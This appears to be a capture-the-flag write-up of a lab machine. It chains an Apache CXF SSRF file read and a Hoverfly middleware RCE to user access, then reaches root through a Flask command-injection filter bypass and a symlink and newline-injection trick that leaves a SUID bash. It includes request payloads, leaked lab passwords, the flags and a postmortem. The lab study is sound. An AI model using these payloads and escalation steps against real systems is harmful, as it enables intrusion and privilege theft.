# DevArea — 10.129.16.166

## Box Summary
- **OS:** Ubuntu (kernel 6.8.0-106-generic)
- **Hostname:** devarea.htb
- **Difficulty:** Medium-Hard
- **Key themes:** SSRF chaining, CVE exploitation, command injection filter bypass, symlink abuse, systemd timer hijacking

---

## Reconnaissance

### Port Scan

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21   | FTP     | vsftpd 3.0.5 | Anonymous login, `pub/employee-service.jar` |
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu | Standard |
| 80   | HTTP    | Apache 2.4.58 | Static site, redirects to `devarea.htb`, mod_rewrite + AllowOverride All + FollowSymLinks |
| 8080 | HTTP    | Jetty 9.4.27 | Apache CXF 3.2.14 SOAP service (`/employeeservice`) |
| 8500 | HTTP    | Go net/http | Hoverfly proxy port |
| 8888 | HTTP    | Go net/http | Hoverfly admin dashboard (auth required) |

### Key Findings from Recon
- Anonymous FTP yields `employee-service.jar` — decompiled to reveal a CXF 3.2.14 SOAP endpoint
- Apache CXF 3.2.14 is vulnerable to CVE-2022-46364 (SSRF via MTOM XOP:Include)
- Hoverfly is vulnerable to CVE-2025-54123 (middleware command injection RCE)
- Hoverfly dashboard requires auth (JWT-based, `/api/token-auth`)

---

## Exploitation — User (dev_ryan)

### Step 1: SSRF via Apache CXF (CVE-2022-46364)

The SOAP service accepts MTOM-encoded requests. The `XOP:Include` href attribute causes the server to fetch arbitrary URLs (GET only), including `file://` for local file reads.

**SSRF confirmed:** Sent `href="http://10.10.14.80:9999/test"` — server called back. Response base64-encoded in SOAP reply.

**File read:** `href="file:///etc/passwd"` — returned full passwd file. Key users:
- `dev_ryan` (uid 1001, `/home/dev_ryan`, `/bin/bash`)
- `syswatch` (uid 984, `/opt/syswatch`, nologin)

**Critical file:** `file:///etc/systemd/system/hoverfly.service` revealed:
```
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU
```

### Step 2: Hoverfly RCE (CVE-2025-54123)

Authenticated to Hoverfly admin API:
```
POST /api/token-auth {"username":"admin","password":"O7IJ27MyyXiU"} → JWT
```

Exploited middleware endpoint:
```
PUT /api/v2/hoverfly/middleware
{"binary": "/bin/bash", "script": "id"}
→ STDOUT: uid=1001(dev_ryan)
```

### Step 3: Persistent Access

Planted SSH key via Hoverfly RCE. **User flag: `95528e4df12447619aa7f7798aa3af54`**

---

## Privilege Escalation — Root

### Enumeration

**sudo -l:** `(root) NOPASSWD: /opt/syswatch/syswatch.sh` (except web-stop, web-restart)

**ACL:** `/opt/syswatch/` has `user:dev_ryan:---` — dev_ryan specifically denied.

**Internal services:**
- Flask web GUI on `localhost:7777` (syswatch user)
- `syswatch-monitor.timer` runs `monitor.sh` as root every 5 min

**Source code found:** `/home/dev_ryan/syswatch-v1.zip`

### Source Code Analysis

**app.py — Command injection in `/service-status`:**
```python
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")
subprocess.run([f"systemctl status --no-pager {service}"], shell=True, ...)
```
- Blocks: `;` `/` `\` `&` `.` `<` `>` `\r` uppercase
- Allows: `|` `$()` `` ` `` `\n` lowercase digits `~` `_` `-`

**syswatch.sh — `log_message()` has no symlink check:**
```bash
echo "$(date) - $msg" >> "$LOG_DIR/system.log"
```

**monitor.sh — Executes all plugins as root:**
```bash
for script in /opt/syswatch/plugins/*.sh; do bash "$script" & done
```

### Step 4: Command Injection as syswatch

Forged Flask session with known SECRET_KEY. Accessed via Hoverfly proxy (spy mode).

Injection: `service=x|id` → `uid=984(syswatch)`

For complex payloads (avoiding `/`, `.`, uppercase): `echo <hex> | xxd -r -p | python3`

### Step 5: Symlink + Newline Injection → Root

1. **Symlink:** `logs/system.log` → `plugins/root_monitor.sh` (created by syswatch via python3 injection)

2. **Trigger root write:** `sudo syswatch.sh plugin cpu_mem_monitor.sh $'\ncp /bin/bash /tmp/rootbash3\nchmod 4755 /tmp/rootbash3'`
   - `log_message` runs as ROOT via sudo
   - Writes through symlink → creates `plugins/root_monitor.sh`
   - Newline in args splits the log line, embedding valid bash commands

3. **Timer execution:** `syswatch-monitor.timer` runs `monitor.sh` → executes `root_monitor.sh` as root → SUID bash created

**Root flag: `0acae446a3d5a902120d351343663f02`**

---

## Credentials

| Service | Username | Password/Key | Source |
|---------|----------|--------------|--------|
| Hoverfly | admin | O7IJ27MyyXiU | systemd service file via SSRF |
| SSH | dev_ryan | ed25519 key | planted via Hoverfly RCE |
| Flask | - | SECRET_KEY: `f3ac48a6...36725` | /etc/syswatch.env |
| Syswatch Web | admin | SyswatchAdmin2026 (hashed in DB) | /etc/syswatch.env |

## CVEs Used

| CVE | Service | Impact |
|-----|---------|--------|
| CVE-2022-46364 | Apache CXF 3.2.14 | SSRF via MTOM XOP:Include |
| CVE-2025-54123 | Hoverfly ≤1.11.3 | RCE via middleware endpoint |

---

## Dead Ends

1. Apache mod_rewrite CVEs — rewrite uses `[R=301]`, not local mapping
2. Hoverfly file read CVE-2024-45388 — patched
3. Flask SSTI — autoescaping in all contexts
4. Plugin argument injection — properly quoted
5. Direct write to plugins/ as syswatch — root-owned, only r-x
6. Flask SQLi via session — parameterized queries
7. Postfix mail interception — DNS not controllable
8. ACL bypass via Apache www-data — config not exploitable

---

## Postmortem: What Went Wrong & How to Improve

### Critical Mistake: Not checking home directory early
The source code zip (`syswatch-v1.zip`) was in `/home/dev_ryan/` the entire time. I spent ~60 minutes trying to read `app.py` and `syswatch.sh` through indirect methods (SSRF, /proc, Flask debug mode, Hoverfly file read CVE) before running a basic `ls -la /home/dev_ryan/`. A standard enumeration checklist (or LinPEAS) would have found this immediately.

**Fix:** Always run `ls -la ~` and `find ~ -type f` immediately after getting a shell. Check for backups, configs, source code, and notes.

### Loop 1: Trying to read syswatch source without source access (~60 min)
**Pattern:** Attempted 12+ different ways to read /opt/syswatch/ files (SSRF file://, /proc/pid/fd, Flask static traversal, download endpoint traversal, Hoverfly CVE-2024-45388, strace, bash -x, reverse shell, etc.)

**Root cause:** Fixated on "I need to read the source" without first enumerating what was ALREADY accessible. Classic tunnel vision — solving a subproblem instead of stepping back.

**CS parallel:** This is a depth-first search that went too deep before backtracking. Should have used iterative deepening — spend max 10 minutes per approach before moving to the next.

### Loop 2: Trying to write to plugins/ as syswatch (~20 min)
**Pattern:** After getting syswatch RCE, immediately tried to write to `/opt/syswatch/plugins/` — failed because it's root-owned. Then tried multiple indirect approaches.

**Root cause:** Assumed syswatch owned its own directory structure. Didn't verify permissions before building attack plan.

**Fix:** Always check `find <target> -writable` before attempting writes. Map out the actual permission model, not the assumed one.

### Loop 3: Apache mod_rewrite CVE rabbit hole (~15 min)
**Pattern:** Researched and attempted CVE-2024-38474/38475 even though the rewrite rule uses `[R=301]` which always redirects.

**Root cause:** Jumped to exploitation before fully analyzing the config. The `[R]` flag makes local file access impossible regardless of encoding bypasses.

**Fix:** Read the full config and understand what each directive does BEFORE attempting CVEs. Match the CVE prerequisites to the actual config.

### What I Did Right
1. **SSRF chain to Hoverfly creds** was efficient — identified the vulnerability, confirmed it, exploited it in 3 steps
2. **CVE research** was parallelized well using multiple agents
3. **Regex bypass analysis** was methodical — tested each character class systematically
4. **Symlink attack** was creative and combined multiple primitive operations into a working chain
5. **Hex encoding bypass** for the Flask command injection was a solid technique

### Efficiency Improvements for Next Time
1. **Enumeration checklist** after every new shell: home dir, sudo -l, SUID, cron, timers, writable files, groups, capabilities, source code/backups
2. **Time-box each approach** at 15 minutes max before pivoting
3. **Map the privilege graph** early: who owns what, who can write where, who runs what
4. **Read source code FIRST** when available — don't try to infer behavior from black-box testing
5. **Check for easy wins** before complex exploits: backup files, config files, credentials in env vars, world-readable sensitive files
